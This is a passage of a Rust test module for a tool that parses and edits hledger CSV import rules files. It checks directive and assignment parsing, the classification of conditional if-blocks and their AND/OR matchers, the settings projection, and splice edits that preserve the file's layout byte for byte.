        assert_eq!(directive("skip 1\n").name, DirectiveName::Skip);
        assert_eq!(
            assignment("end\n").field,
            HledgerField::Control(ControlField::End)
        );
    }

    #[test]
    fn an_assignments_separator_span_is_what_keeps_a_column_aligned_file_aligned() {
        let doc = parsed("account2      expenses:unknown\n");
        let ItemKind::Assignment(assignment) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &assignment.field_span), "account2");
        assert_eq!(at(&doc, &assignment.sep_span), "      ");
        assert_eq!(at(&doc, &assignment.value_span), "expenses:unknown");
    }

    #[test]
    fn an_assignment_accepts_every_separator_form_hledger_does() {
        for (line, sep, value) in [
            ("account2  x\n", "  ", "x"),
            ("account2:x\n", ":", "x"),
            ("account2: x\n", ": ", "x"),
            ("account2 : x\n", " : ", "x"),
            // A bare field name assigns the empty string, per hledger's
            // `lift eolof >> return ""`.
            ("account2\n", "", ""),
            ("account2:\n", ":", ""),
        ] {
            let doc = parsed(line);
            let ItemKind::Assignment(assignment) = only(&doc) else {
                panic!("{line:?} should be an assignment")
            };
            assert_eq!(at(&doc, &assignment.sep_span), sep, "{line:?}");
            assert_eq!(at(&doc, &assignment.value_span), value, "{line:?}");
        }
    }

    #[test]
    fn an_assignment_value_includes_a_semicolon() {
        // hledger's `fieldvalp` is `anySingle manyTill eolof` — it does NO
        // comment stripping, so this `;` is part of the account comment.
        let doc = parsed("comment  paid ; not a comment\n");
        let ItemKind::Assignment(assignment) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &assignment.value_span), "paid ; not a comment");
    }

    /// The bug this warning exists for, end to end.
    ///
    /// The value is asserted **unchanged** in the same breath as the warning:
    /// that pairing is the point. Ledgeline does not run the import — real
    /// hledger does — so trimming here would only make the panel disagree with
    /// the journal that lands.
    #[test]
    fn an_account_value_with_a_trailing_comment_warns_without_being_trimmed() {
        let doc = parsed("account2 expenses:unknown ; set a default\n");
        let ItemKind::Assignment(assignment) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(
            at(&doc, &assignment.value_span),
            "expenses:unknown ; set a default"
        );
        assert_eq!(doc.warnings().len(), 1);
        assert_eq!(doc.warnings()[0].item, Some(ItemId(0)));
        assert!(doc.warnings()[0].message.contains("account2"));
        assert!(
            doc.warnings()[0]
                .message
                .contains("no end-of-line comments")
        );
        // The account hledger would really use is quoted back, so the warning
        // shows the absurdity rather than describing it.
        assert!(
            doc.warnings()[0]
                .message
                .contains("expenses:unknown ; set a default")
        );
    }

    /// hledger 1.52 rejects two-spaces-then-`;` outright ("unexpected space"),
    /// so the habit borrowed from journal postings is not a rescue. The warning
    /// has to fire on the form people actually reach for next.
    #[test]
    fn two_spaces_before_the_semicolon_warns_too() {
        let doc = parsed("account1  assets:bank  ; still not a comment\n");
        assert_eq!(doc.warnings().len(), 1);
        assert!(doc.warnings()[0].message.contains("account1"));
    }

    /// A conditional `account2` is the likelier home for the mistake.
    #[test]
    fn an_account_comment_inside_a_conditional_block_warns() {
        let doc = parsed("if COFFEE\n    account2  expenses:coffee ; why\n");
        assert_eq!(doc.warnings().len(), 1);
        assert_eq!(doc.warnings()[0].item, Some(ItemId(0)));
        assert!(doc.warnings()[0].message.contains("account2"));
    }

    /// Only `accountN` is silently absorbed into a name that still looks fine.
    /// `amount` is already a loud hledger error, `comment` *is* a comment, and a
    /// `description` keeps reading as a description — warning on those would be
    /// noise. `#` stays quiet because `assets:card #1234` is a real account name.
    #[test]
    fn only_account_fields_warn_and_only_about_a_semicolon() {
        for quiet in [
            "comment  paid ; not a comment\n",
            "description  ACME ; note\n",
            "amount  -5 ; note\n",
            "account2  assets:card #1234\n",
            "account2  expenses:plain\n",
        ] {
            assert!(
                parsed(quiet).warnings().is_empty(),
                "{quiet:?} should not warn"
            );
        }
    }

    // -- classification: conditional blocks --------------------------------

    #[test]
    fn both_if_layouts_classify_with_their_matchers_in_file_order() {
        // No `&` anywhere, so every group holds exactly one matcher: a plain OR
        // list is the degenerate case of the grouped shape, not a second one.
        let inline = if_block("if ACME PAYROLL\nCOSTCO WHOLESALE\n    account2  income:salary\n");
        assert_eq!(inline.layout, IfLayout::Inline);
        assert_eq!(
            patterns(&inline),
            [vec!["ACME PAYROLL"], vec!["COSTCO WHOLESALE"]]
        );

        let stacked = if_block("if\nCOFFEE\nPEETS\n    account2  expenses:coffee\n");
        assert_eq!(stacked.layout, IfLayout::Stacked);
        assert_eq!(patterns(&stacked), [vec!["COFFEE"], vec!["PEETS"]]);
        assert!(
            matchers(&stacked).all(|matcher| matcher.scope == MatchScope::WholeRecord),
            "a bare regex is matched against the whole record"
        );
    }

    #[test]
    fn a_plain_ampersand_chain_is_one_and_ed_group() {
        // hledger 1.52, verified against the binary: `if\nCOFFEE\n& DOWNTOWN`
        // selects only a record containing BOTH, so these two lines are one
        // AND-ed group rather than two OR-ed alternatives.
        let block = if_block("if\nCOFFEE\n& DOWNTOWN\n  account2  x\n");
        assert_eq!(block.layout, IfLayout::Stacked);
        assert_eq!(patterns(&block), [vec!["COFFEE", "DOWNTOWN"]]);
    }

    #[test]
    fn a_field_scoped_matcher_records_the_name_without_its_percent() {
        let doc = parsed("if %description COFFEE HOUSE\n  account2  x\n");
        let ItemKind::IfBlock(block) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(
            first_matcher(block).scope,
            MatchScope::Field("description".to_string())
        );
        // The `%` is punctuation, not part of the name, so a rename splices only
        // the name.
        assert_eq!(
            first_matcher(block)
                .field_span
                .as_ref()
                .map(|span| at(&doc, span)),
            Some("description")
        );
        assert_eq!(at(&doc, &first_matcher(block).pattern_span), "COFFEE HOUSE");

        // A column number reads the same way.
        let numbered = if_block("if %3 COFFEE\n  account2  x\n");
        assert_eq!(
            first_matcher(&numbered).scope,
            MatchScope::Field("3".to_string())
        );

        // A `%` reference with no pattern after it is not a field matcher at
        // all: hledger's `try fieldmatcherp <|> recordmatcherp` falls back to
        // reading the whole line as a whole-record regex.
        let fallback = if_block("if %description\n  account2  x\n");
        assert_eq!(first_matcher(&fallback).scope, MatchScope::WholeRecord);
        assert_eq!(first_matcher(&fallback).pattern, "%description");
        assert_eq!(first_matcher(&fallback).field_span, None);
    }

    #[test]
    fn a_matcher_pattern_is_trimmed_although_a_value_is_not() {
        // hledger's `regexp` ends in `T.strip`; its `fieldvalp` does not. The
        // asymmetry is hledger's.
        let doc = parsed("if   COFFEE   \n  account2  expenses:coffee   \n");
        let ItemKind::IfBlock(block) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(first_matcher(block).pattern, "COFFEE");
        assert_eq!(at(&doc, &first_matcher(block).pattern_span), "COFFEE");
        assert_eq!(
            at(&doc, &block.assignments[0].value_span),
            "expenses:coffee   "
        );
    }

    #[test]
    fn block_indent_captures_tabs_as_faithfully_as_spaces() {
        let doc = parsed("if FOO\n\taccount2  x\n\tcomment  y\n");
        let ItemKind::IfBlock(block) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &block.indent), "\t");
        assert_eq!(block.assignments.len(), 2);

        let doc = parsed("if FOO\n    account2  x\n");
        let ItemKind::IfBlock(block) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &block.indent), "    ");

        // A whitespace-only line's whole content is its indentation, so it is
        // not what `indent` aligns to.
        let doc = parsed("if FOO\n      \n  account2  x\n");
        let ItemKind::IfBlock(block) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &block.indent), "  ");
        assert_eq!(block.assignments.len(), 1);
    }

    // -- classification: one test per opaque reason ------------------------

    #[test]
    fn a_conditional_table_is_never_editable() {
        assert_eq!(
            opaque_reason("if,%description,account2\nACME,income:salary\n"),
            OpaqueReason::IfTable
        );
    }

    #[test]
    fn a_double_ampersand_matcher_is_not_editable() {
        // hledger 1.52 reads a leading `&&` as an AND join, exactly like a
        // single `&` — verified against the binary. It stays opaque anyway: on
        // one line the same bytes may be two literal ampersands inside one
        // regex, and telling the two apart needs hledger's own parser.
        assert_eq!(
            opaque_reason("if\n%description SUPERMARKET\n&& %note GROCERY\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
        // Also when it joins two matchers on one line — and, deliberately, when
        // it is merely two ampersands inside one regex.
        assert_eq!(
            opaque_reason("if COFFEE && HOUSE\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
        // And when it follows a plain `&` chain, which is otherwise editable:
        // one bad line is enough.
        assert_eq!(
            opaque_reason("if A\n& B\n&& C\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
        // A `&&` inside a continuation's own pattern is the same problem.
        assert_eq!(
            opaque_reason("if A\n& B && C\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
    }

    #[test]
    fn an_and_not_matcher_is_not_editable() {
        assert_eq!(
            opaque_reason("if\n%description ONLINE\n& ! %note REFUND\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
        // `&& !` and a gapless `&!` are the same refusal: `!` is scoped to its
        // own line rather than to a group, so nothing here models it.
        assert_eq!(
            opaque_reason("if ONLINE\n&& ! REFUND\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
        assert_eq!(
            opaque_reason("if ONLINE\n&!REFUND\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
    }

    #[test]
    fn an_ampersand_with_nothing_above_it_to_and_with_is_not_editable() {
        // hledger 1.52 ACCEPTS both of these and treats the `&` as a no-op —
        // `if\n& COFFEE` imports exactly what `if\nCOFFEE` does, verified
        // against the binary. This module declines rather than promise an edit
        // preserves a combinator that combines nothing.
        assert_eq!(
            opaque_reason("if\n& COFFEE\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
        assert_eq!(
            opaque_reason("if & COFFEE\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
        // A bare `&`, which hledger rejects outright, lands here too.
        assert_eq!(
            opaque_reason("if COFFEE\n&\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
    }

    #[test]
    fn an_ampersand_is_a_prefix_only_at_the_head_of_a_matcher_line() {
        // `%description &COFFEE` is a regex matching a literal ampersand — it
        // selects no record containing plain `COFFEE`, verified against
        // hledger 1.52 — so the `&` is content and the block is one OR group.
        let block = if_block("if %description &COFFEE\n  account2  x\n");
        assert_eq!(patterns(&block), [vec!["&COFFEE"]]);
    }

    #[test]
    fn an_and_chain_admits_every_matcher_shape_a_plain_line_does() {
        // Field-scoped, gapless, tab-separated and over-padded continuations
        // are all the same matcher to hledger 1.52, all verified against the
        // binary; the pattern is trimmed at both ends exactly as a plain
        // matcher's is.
        let block = if_block(
            "if\n%description COFFEE\n&%extra alpha\n&\tDOWNTOWN\n&    UPTOWN   \n  account2  x\n",
        );
        assert_eq!(
            patterns(&block),
            [vec!["COFFEE", "alpha", "DOWNTOWN", "UPTOWN"]]
        );
        assert_eq!(
            matchers(&block)
                .map(|m| m.scope.clone())
                .collect::<Vec<_>>(),
            [
                MatchScope::Field("description".to_string()),
                MatchScope::Field("extra".to_string()),
                MatchScope::WholeRecord,
                MatchScope::WholeRecord,
            ]
        );
    }

    #[test]
    fn or_groups_and_and_chains_interleave_in_file_order() {
        // `(A and B) or (C and D)` — hledger 1.52 selects a record matching
        // either pair, verified against the binary.
        let stacked = if_block("if\nA\n& B\nC\n& D\n  account2  x\n");
        assert_eq!(patterns(&stacked), [vec!["A", "B"], vec!["C", "D"]]);

        // An inline header's matcher heads the first group just as a stacked
        // one's first line does, and hledger accepts a continuation under it.
        let inline = if_block("if A\n& B\nC\n  account2  x\n");
        assert_eq!(inline.layout, IfLayout::Inline);
        assert_eq!(patterns(&inline), [vec!["A", "B"], vec!["C"]]);
    }

    #[test]
    fn every_other_matcher_rule_still_applies_inside_a_group() {
        // Grouping is about a line's prefix; rules 3 and 4 are about the
        // pattern, and a continuation gets them unchanged.
        assert_eq!(
            opaque_reason("if A\n& (B)\n  account2  x\n"),
            OpaqueReason::MatchGroup
        );
        assert_eq!(
            opaque_reason("if A\n& ;B\n  account2  x\n"),
            OpaqueReason::CommentLikeMatcher
        );
    }

    #[test]
    fn a_negated_matcher_is_not_editable() {
        assert_eq!(
            opaque_reason("if ! %description TRANSFER\n  account2  x\n"),
            OpaqueReason::CombinedMatcher
        );
    }

    #[test]
    fn a_match_group_is_not_editable() {
        // A group means a `\N` backreference can be meaningful, so an assignment
        // value may silently depend on the matcher.
        assert_eq!(
            opaque_reason("if %description (....-..)\n  comment2  period \\1\n"),
            OpaqueReason::MatchGroup
        );
        // `\\` escapes itself, so the paren after it is unescaped.
        assert_eq!(
            opaque_reason("if A\\\\(B\n  account2  x\n"),
            OpaqueReason::MatchGroup
        );
    }

    #[test]
    fn an_escaped_paren_stays_editable() {
        // `\(` is a literal paren: no group, so no backreference, so nothing an
        // edit could break.
        let block = if_block("if %description COFFEE\\(X\n  account2  x\n");
        assert_eq!(first_matcher(&block).pattern, "COFFEE\\(X");
        assert_eq!(
            first_matcher(&block).scope,
            MatchScope::Field("description".to_string())
        );
    }

    #[test]
    fn a_comment_like_matcher_is_not_editable() {
        // hledger reads all three of these as regexes, not comments.
        for line in [
            "if ;looks like a comment\n  account2  x\n",
            "if #looks like a comment\n  account2  x\n",
            "if *looks like a comment\n  account2  x\n",
        ] {
            assert_eq!(
                opaque_reason(line),
                OpaqueReason::CommentLikeMatcher,
                "{line:?}"
            );
        }
    }

    #[test]
    fn skip_in_a_block_body_is_control_flow_not_an_assignment() {
        assert_eq!(
            opaque_reason("if SKIP THIS ROW\n  skip 1\n"),
            OpaqueReason::ControlFlowInBlock
        );
    }

    #[test]
    fn end_in_a_block_body_is_control_flow() {
        assert_eq!(
            opaque_reason("if STOP HERE\n  account2  x\n  end\n"),
            OpaqueReason::ControlFlowInBlock
        );
    }

    #[test]
    fn an_unparsable_block_body_line_is_not_editable() {
        assert_eq!(
            opaque_reason("if FOO\n  nonsense value\n"),
            OpaqueReason::UnparsedBlockBody
        );
    }

    #[test]
    fn an_indented_comment_in_a_block_body_is_not_editable() {
        // hledger 1.52 rejects the whole file for one of these — verified
        // against the binary, which is why it cannot be quietly tolerated.
        assert_eq!(
            opaque_reason("if FOO\n  ; why this rule exists\n  account2  x\n"),
            OpaqueReason::UnparsedBlockBody
        );
    }

    #[test]
    fn a_degenerate_block_is_unclassified() {
        // No assignments...
        assert_eq!(opaque_reason("if FOO\nBAR\n"), OpaqueReason::Unclassified);
        // ...and no matchers.
        assert_eq!(
            opaque_reason("if\n  account2  x\n"),
            OpaqueReason::Unclassified
        );
    }

    #[test]
    fn the_matcher_rules_are_checked_in_the_documented_order() {
        // `;(x)` breaks rules 3 and 4 at once; the reason names the first.
        assert_eq!(
            opaque_reason("if ;(x)\n  account2  y\n"),
            OpaqueReason::MatchGroup
        );
        // A bad matcher outranks a bad body.
        assert_eq!(
            opaque_reason("if ! FOO\n  nonsense value\n"),
            OpaqueReason::CombinedMatcher
        );
    }

    // -- settings ----------------------------------------------------------

    /// One file naming every setting [`RulesDoc::settings`] projects, one per
    /// line and with no blank lines, so an item's id is its line index.
    const EVERY_SETTING: &str = "source bank/*.csv | tee copy.csv\n\
         archive\n\
         encoding utf8\n\
         date-format %Y-%m-%d\n\
         decimal-mark .\n\
         separator ,\n\
         skip 1\n\
         timezone America/Denver\n\
         newest-first\n\
         intra-day-reversed\n\
         balance-type ==\n\
         fields date, description, amount\n\
         account1 assets:bank:checking\n\
         account2 expenses:unknown\n\
         currency $\n\
         end\n";

    #[test]
    fn settings_covers_every_directive_and_names_the_item_that_produced_it() {
        let doc = parsed(EVERY_SETTING);
        assert_eq!(doc.items().len(), 16, "one item per line");
        let settings = doc.settings();

        assert_eq!(
            settings.source,
            Some(Setting {
                value: SourceSetting {
                    raw: "bank/*.csv | tee copy.csv".to_string(),
                    has_command: true,
                },
                item: ItemId(0),
            })
        );
        assert_eq!(
            settings.archive,
            Some(Setting {
                value: (),
                item: ItemId(1)
            })
        );
        assert_eq!(
            settings.encoding,
            Some(Setting {
                value: "utf8".to_string(),
                item: ItemId(2)
            })
        );
        assert_eq!(
            settings.date_format,
            Some(Setting {
                value: "%Y-%m-%d".to_string(),
                item: ItemId(3)
            })
        );
        assert_eq!(
            settings.decimal_mark,
            Some(Setting {
                value: '.',
                item: ItemId(4)
            })
        );
        assert_eq!(
            settings.separator,
            Some(Setting {
                value: Separator::Char(','),
                item: ItemId(5)
            })
        );
        assert_eq!(
            settings.skip,
            Some(Setting {
                value: 1,
                item: ItemId(6)
            })
        );
        assert_eq!(
            settings.timezone,
            Some(Setting {
                value: "America/Denver".to_string(),
                item: ItemId(7)
            })
        );
        assert_eq!(
            settings.newest_first,
            Some(Setting {
                value: (),
                item: ItemId(8)
            })
        );
        assert_eq!(
            settings.intra_day_reversed,
            Some(Setting {
                value: (),
                item: ItemId(9)
            })
        );
        assert_eq!(
            settings.balance_type,
            Some(Setting {
                value: BalanceType::Total,
                item: ItemId(10)
            })
        );
        assert_eq!(
            settings.fields,
            Some(Setting {
                value: vec![
                    "date".to_string(),
                    "description".to_string(),
                    "amount".to_string()
                ],
                item: ItemId(11),
            })
        );
        assert_eq!(
            settings.account1,
            Some(Setting {
                value: "assets:bank:checking".to_string(),
                item: ItemId(12)
            })
        );
        assert_eq!(
            settings.account2,
            Some(Setting {
                value: "expenses:unknown".to_string(),
                item: ItemId(13)
            })
        );
        assert_eq!(
            settings.currency,
            Some(Setting {
                value: "$".to_string(),
                item: ItemId(14)
            })
        );
        assert_eq!(
            settings.end,
            Some(Setting {
                value: (),
                item: ItemId(15)
            })
        );
    }

    #[test]
    fn settings_takes_the_last_directive_but_the_first_skip() {
        let doc = parsed(
            "skip 2\nskip 1\ndate-format %m/%d/%Y\ndate-format %Y-%m-%d\naccount2 a\naccount2 b\n",
        );
        let settings = doc.settings();
        // Verified against hledger 1.52: `skip 2` then `skip 1` skips TWO
        // records. The first has already acted by the time the second is read.
        assert_eq!(
            settings.skip,
            Some(Setting {
                value: 2,
                item: ItemId(0)
            })
        );
        // Everything else is last-one-wins, which is what hledger's directive
        // lookup does.
        assert_eq!(
            settings.date_format,
            Some(Setting {
                value: "%Y-%m-%d".to_string(),
                item: ItemId(3)
            })
        );
        assert_eq!(
            settings.account2,
            Some(Setting {
                value: "b".to_string(),
                item: ItemId(5)
            })
        );
    }

    #[test]
    fn a_value_assigned_inside_an_if_block_never_reaches_settings() {
        // The whole reason this projection exists: a conditional `account2` is
        // not the file's default, and presenting it as one would be a lie a
        // preferences panel could then write back.
        let doc = parsed(
            "account2 expenses:unknown\n\nif COFFEE\n  account2   expenses:coffee\n  currency  EUR\n",
        );
        let settings = doc.settings();
        assert_eq!(
            settings.account2.map(|entry| entry.value),
            Some("expenses:unknown".to_string())
        );
        assert_eq!(settings.currency, None);
    }

    #[test]
    fn settings_says_nothing_about_a_file_that_says_nothing() {
        assert_eq!(parsed("; just a note\n").settings(), Settings::default());
        assert_eq!(parsed("").settings(), Settings::default());
        // An opaque construct contributes nothing either — there is no value to
        // project, only bytes to preserve.
        assert_eq!(parsed("skip abc\n").settings(), Settings::default());
    }

    // -- editing: helpers --------------------------------------------------

    /// `keep_all` with item `at`'s slot swapped for a [`Slot::Replace`].
    fn replace_plan(doc: &RulesDoc, at: u32, body: ItemBody) -> EditPlan {
        let mut plan = EditPlan::keep_all(doc);
        plan.order[at as usize] = Slot::Replace(ItemId(at), body);
        plan
    }

    /// The text `doc` renders with item `at`'s body replaced.
    ///
    /// Every splice test goes through here, so every one of them also proves the
    /// result survives [`RulesDoc::verify`] — a splice that produced the right
    /// bytes but re-parsed as a different construct would fail here.
    fn replaced(doc: &RulesDoc, at: u32, body: ItemBody) -> String {
        let plan = replace_plan(doc, at, body);
        let out = doc.apply(&plan).expect("the replacement renders");
        assert_eq!(doc.verify(&plan, &out), Ok(()), "a replacement must verify");
        out
    }

    /// Why a replacement was refused.
    fn replace_error(doc: &RulesDoc, at: u32, body: ItemBody) -> RulesError {
        doc.apply(&replace_plan(doc, at, body))
            .expect_err("the replacement must be refused")
    }

    /// The text a fresh item renders to, inserted into an empty document.
    fn inserted(body: ItemBody) -> String {
        let doc = parsed("");
        let plan = EditPlan {
            order: vec![Slot::Insert(body)],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("the insert renders");
        assert_eq!(doc.verify(&plan, &out), Ok(()), "an insert must verify");
        out
    }

    /// Why an insert was refused.
    fn insert_error(body: ItemBody) -> RulesError {
        let doc = parsed("");
        doc.apply(&EditPlan {
            order: vec![Slot::Insert(body)],
            delete: Vec::new(),
        })
        .expect_err("the insert must be refused")
    }

    fn account(n: u8) -> HledgerField {
        HledgerField::Numbered {
            base: NumberedField::Account,
            n,
        }
    }

    fn whole(pattern: &str) -> MatcherSpec {
        MatcherSpec {
            scope: MatchScope::WholeRecord,
            pattern: pattern.to_string(),
        }
    }

    fn scoped(field: &str, pattern: &str) -> MatcherSpec {
        MatcherSpec {
            scope: MatchScope::Field(field.to_string()),
            pattern: pattern.to_string(),
        }
    }

    fn assign(field: HledgerField, value: &str) -> (HledgerField, String) {
        (field, value.to_string())
    }

    /// A block body whose matchers are a plain OR list — one matcher per group,
    /// which is what every rules file this module could already edit parses to.
    /// The grouped cases spell their groups out with [`grouped_block`].
    fn block_of(matchers: Vec<MatcherSpec>, assignments: Vec<(HledgerField, String)>) -> ItemBody {
        grouped_block(
            matchers
                .into_iter()
                .map(|matcher| vec![matcher])
                .collect::<Vec<_>>(),
            assignments,
        )
    }

    /// A block body from explicit OR-groups of AND-ed matchers.
    fn grouped_block(
        groups: Vec<Vec<MatcherSpec>>,
        assignments: Vec<(HledgerField, String)>,
    ) -> ItemBody {
        ItemBody::IfBlock {
            groups: groups
                .into_iter()
                .map(|matchers| MatcherGroupSpec { matchers })
                .collect(),
            assignments,
        }
    }

    /// The message a [`RulesError::Invalid`] carries.
    fn invalid_message(error: &RulesError) -> String {
        match error {
            RulesError::Invalid(message) => message.clone(),
            other => panic!("expected an Invalid error, got {other:?}"),
        }
    }

    // -- the leaf-splicing table, one test per row -------------------------

    #[test]
    fn an_assignment_value_edit_reuses_the_separator_verbatim() {
        // The whole reason a column-aligned file stays aligned with no alignment
        // code: the whitespace between field and value is never re-derived.
        let doc = parsed("account2      expenses:unknown\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Assignment {
                    field: account(2),
                    value: "expenses:food:coffee".to_string(),
                },
            ),
            "account2      expenses:food:coffee\n"
        );
    }

    #[test]
    fn an_assignment_field_edit_shifts_its_own_column_and_no_other_line() {
        // Re-padding this line would misalign the two neighbours we are
        // contractually not touching, so the column moves by the difference in
        // name length and everything else stays exactly where it was.
        let doc =
            parsed("account1      assets:bank\naccount2      expenses:unknown\ncurrency      $\n");
        assert_eq!(
            replaced(
                &doc,
                1,
                ItemBody::Assignment {
                    field: account(10),
                    value: "expenses:unknown".to_string(),
                },
            ),
            "account1      assets:bank\naccount10      expenses:unknown\ncurrency      $\n"
        );
    }

    #[test]
    fn a_fields_name_edit_splices_only_that_name() {
        // Two deliberately irregular gaps: a rename must not tidy either of them.
        let doc = parsed("fields date,  description ,amount\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Fields {
                    names: ["date", "memo", "amount"].map(String::from).to_vec(),
                },
            ),
            "fields date,  memo ,amount\n"
        );
    }

    #[test]
    fn a_fields_arity_change_rerenders_with_the_observed_separator() {
        // Tight commas in, tight commas out — and the trailing text hledger
        // discards is still not ours to drop.
        let doc = parsed("fields date,description,amount;a note\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Fields {
                    names: ["date", "description", "amount", "note"]
                        .map(String::from)
                        .to_vec(),
                },
            ),
            "fields date,description,amount,note;a note\n"
        );
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Fields {
                    names: ["date", "amount"].map(String::from).to_vec(),
                },
            ),
            "fields date,amount;a note\n"
        );
    }

    #[test]
    fn a_directive_value_edit_splices_only_the_value() {
        let doc = parsed("date-format   %m/%d/%Y\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Directive {
                    name: DirectiveName::DateFormat,
                    value: DirectiveValue::Text("%Y-%m-%d".to_string()),
                },
            ),
            "date-format   %Y-%m-%d\n"
        );

        // The `:` form is punctuation the user chose; an edit keeps it.
        let doc = parsed("separator:,\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Directive {
                    name: DirectiveName::Separator,
                    value: DirectiveValue::Separator(Separator::Char(';')),
                },
            ),
            "separator:;\n"
        );
    }

    #[test]
    fn an_unchanged_directive_value_keeps_bytes_its_typed_value_would_lose() {
        // `skip 1 ` parses to `Skip(1)`, which renders as `1`. Splicing the
        // original span is what keeps the trailing space nobody asked about.
        let doc = parsed("skip 1 \n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Directive {
                    name: DirectiveName::Skip,
                    value: DirectiveValue::Skip(1),
                },
            ),
            "skip 1 \n"
        );
    }

    #[test]
    fn a_directive_written_with_no_value_gains_the_one_space_it_needs() {
        // There is no separator to reuse, and `date-format%Y-%m-%d` is not a
        // directive at all.
        let doc = parsed("date-format\n");
        assert_eq!(
            replaced(
                &doc,
                0,
                ItemBody::Directive {
                    name: DirectiveName::DateFormat,
                    value: DirectiveValue::Text("%Y-%m-%d".to_string()),
                },
            ),
            "date-format %Y-%m-%d\n"
        );
    }

    /// An inline block with two matchers and two column-aligned assignments —
    /// enough shape for every conditional-block row of the splicing table.
    const BLOCK: &str =
        "if ACME PAYROLL\nCOSTCO\n    account2  income:salary\n    comment   monthly pay\n";

    #[test]
    fn an_if_block_matcher_edit_leaves_every_other_line_alone() {
        let doc = parsed(BLOCK);
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("ACME PAYROLL"), whole("COSTCO WHOLESALE")],
                    vec![
                        assign(account(2), "income:salary"),
                        assign(HledgerField::Comment, "monthly pay"),
                    ],
                ),
            ),
            "if ACME PAYROLL\nCOSTCO WHOLESALE\n    account2  income:salary\n    comment   monthly pay\n"
        );
    }

    #[test]
    fn an_if_block_assignment_edit_splices_at_leaf_level_and_keeps_the_indent() {
        let doc = parsed(BLOCK);
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![whole("ACME PAYROLL"), whole("COSTCO")],
                    vec![
                        assign(account(2), "income:salary:acme"),
                        assign(HledgerField::Comment, "monthly pay"),
                    ],
                ),
            ),
            "if ACME PAYROLL\nCOSTCO\n    account2  income:salary:acme\n    comment   monthly pay\n"
        );
    }

    #[test]
    fn an_added_if_block_matcher_lands_at_column_one_below_the_last_one() {
        let doc = parsed(BLOCK);
        assert_eq!(
            replaced(
                &doc,
                0,
                block_of(
                    vec![
                        whole("ACME PAYROLL"),
                        whole("COSTCO"),
                        scoped("description", "SAFEWAY")
                    ],
                    vec![
                        assign(account(2), "income:salary"),
                        assign(HledgerField::Comment, "monthly pay"),
                    ],
                ),
            ),
            "if ACME PAYROLL\nCOSTCO\n%description SAFEWAY\n    account2  income:salary\n    comment   monthly pay\n"
        );
    }

    /// A stacked block whose matchers are `(A and B) or C`, written with the
    /// gapless `&B` hledger accepts — so a splice that reused the prefix is
    /// visibly different from one that re-rendered it.
    const GROUPED: &str = "if\nA\n&B\nC\n    account2  expenses:x\n";

    #[test]
    fn an_and_ed_matcher_edit_rewrites_only_its_own_line_and_keeps_its_prefix() {
        let doc = parsed(GROUPED);
        assert_eq!(
            replaced(
                &doc,
                0,
                grouped_block(
                    vec![vec![whole("A"), whole("BEE")], vec![whole("C")]],
                    vec![assign(account(2), "expenses:x")],
                ),
            ),
            // `&B` keeps its gapless `&`: the prefix is the file's bytes, not
            // something re-derived from the group shape.
            "if\nA\n&BEE\nC\n    account2  expenses:x\n"
        );
    }

    #[test]
    fn an_added_and_condition_lands_below_the_last_matcher_with_an_ampersand() {
        // Same placement as `an_added_if_block_matcher_lands_at_column_one_
        // below_the_last_one`: column 1, directly below the last matcher line.
        // The only difference between "+ AND condition" and "+ OR group" is the
        // prefix, so both are that one rule.
        let doc = parsed(GROUPED);
        assert_eq!(
            replaced(
                &doc,
                0,
                grouped_block(
                    vec![vec![whole("A"), whole("B")], vec![whole("C"), whole("D")]],
                    vec![assign(account(2), "expenses:x")],
                ),
            ),
            "if\nA\n&B\nC\n& D\n    account2  expenses:x\n"
        );
    }

    #[test]
    fn an_added_or_group_lands_below_the_last_matcher_at_column_one() {
        let doc = parsed(GROUPED);
        assert_eq!(
            replaced(
                &doc,
                0,
                grouped_block(
                    vec![
                        vec![whole("A"), whole("B")],
                        vec![whole("C")],
                        vec![scoped("description", "D"), whole("E")],
                    ],
                    vec![assign(account(2), "expenses:x")],
                ),
            ),
            "if\nA\n&B\nC\n%description D\n& E\n    account2  expenses:x\n"
        );
    }

    #[test]
    fn a_matcher_that_changes_or_group_role_gets_the_prefix_its_new_role_needs() {
        // The one thing grouping can change about a line that already exists.
        // Splitting the AND chain: `&B` becomes its own OR group and loses the
        // `&`; merging: `C` joins the group above it and gains one.
        let doc = parsed(GROUPED);
        assert_eq!(
            replaced(
                &doc,
                0,
                grouped_block(
                    vec![vec![whole("A")], vec![whole("B")], vec![whole("C")]],
                    vec![assign(account(2), "expenses:x")],
                ),
            ),
            "if\nA\nB\nC\n    account2  expenses:x\n"
        );
        assert_eq!(
            replaced(
                &doc,
                0,
                grouped_block(
                    vec![vec![whole("A"), whole("B"), whole("C")]],
                    vec![assign(account(2), "expenses:x")],
                ),
            ),
            "if\nA\n&B\n& C\n    account2  expenses:x\n"
        );
    }

    #[test]
    fn an_inserted_block_writes_its_groups_as_hledgers_own_and_or_shape() {
        assert_eq!(
            inserted(grouped_block(
                vec![
                    vec![scoped("description", "A"), whole("B")],
                    vec![whole("C")],
                ],
